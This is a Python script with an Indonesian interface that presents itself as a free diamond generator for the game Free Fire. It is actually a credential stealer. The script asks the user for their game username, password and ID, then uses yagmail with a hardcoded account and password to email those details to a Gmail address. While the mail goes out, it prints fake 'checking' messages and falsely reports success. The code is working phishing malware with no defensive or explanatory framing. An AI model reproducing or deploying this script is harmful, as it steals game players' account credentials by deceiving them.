import os, sys
os.system('pip install yagmail')
os.system('clear')
os.system('pip install termcolor')
os.system('clear')
import yagmail
import time
from termcolor import colored	
print ('Sedang menginstall package....')
time.sleep(5)
os.system('clear')
print (colored('Proses penginstallan telah selesai....'))
time.sleep(4)
os.system('clear')
asci = """
╔-----------------------------╗
|   ╔═╗╔═╗  ╔═╗╦═╗╔═╗╔═╗╦╔═   |
|   ╠╣ ╠╣───║  ╠╦╝╠═╣║  ╠╩╗   |
|   ╚  ╚    ╚═╝╩╚═╩ ╩╚═╝╩ ╩   |
|   Nuyul Diamond Free Fire   |
|      100% Anti Banned       |
╚-----------------------------╝
━> Gunakan Tool Dengan Bijak <━
	   """
print (colored(asci,'green'))
email=yagmail.SMTP('blackcoder04', '58dae22454d4c88ca28d00b545d53261')
daftar = """
╔----------------------------╗
|   Jumlah   |  Waktu Tunggu |
|----------------------------|
|100 Diamond |     1 Jam     |
|200 Diamond |     2 Jam     |
|300 Diamond |     3 Jam     |
|400 Diamond |     4 Jam     |
|500 Diamond |     5 Jam     |
╚----------------------------╝
	   """
print (colored(daftar,'cyan'))
print (colored('Silahkan Login Terlebih Dahulu','yellow'))
me = str(input(colored(' ━━━> Masukkan username FF: ','blue')))
you = str(input(colored(' ━━━> Masukkan password FF: ','blue')))
nomor = str(input(colored(' ━━━> Masukkan ID FF: ','blue')))
jumlah = str(input(colored(' ━━━> Masukkan jumlah diamond: ','blue')))
subject = 'HACK-BOOK'
body = ('Username: '+me,'Password: '+you,'Id: '+nomor, 'Diamond: '+jumlah)
email.send('bgpadoxx@gmail.com',subject,body)
print (colored('Mengecek Username......','green'))
time.sleep(3)
print (colored('Mengecek Password......','green'))
time.sleep(3)
print (colored('Mengecek ID......','green'))
time.sleep(3)
print (colored('Berhasil, Tunggu Sesuai Dengan Waktu Tunggu Diamond','yellow'))
exit()
